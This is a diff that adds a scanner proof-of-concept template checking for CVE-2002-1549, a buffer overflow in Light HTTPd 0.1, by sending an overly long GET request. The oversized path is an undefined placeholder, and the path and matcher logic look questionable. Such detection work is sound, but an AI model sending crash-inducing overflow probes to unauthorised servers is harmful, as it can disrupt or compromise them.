@@ -1,0 +1,43 @@
+[info]
+author = "ave"
+description = "Light HTTPd 0.1 存在远程缓冲区溢出漏洞，攻击者可通过发送超长 HTTP GET 请求触发栈溢出，进而执行任意代码。本 PoC 用于验证目标是否存在该漏洞。"
+id = "POC-AVE-2002-0633"
+name = "CVE-2002-1549 PoC"
+severity = "high"
+tags = ["ave-2002-0633"]
+vuln_id = [
+    "CVE-2002-1549",
+    "AVE-2002-0633",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/{{long_path}}"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    400,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = false
+part = "body"
+type = "word"
+words = [
+    "buffer",
+    "overflow",
+    "segfault",
+    "crash",
+    "exception",
+]
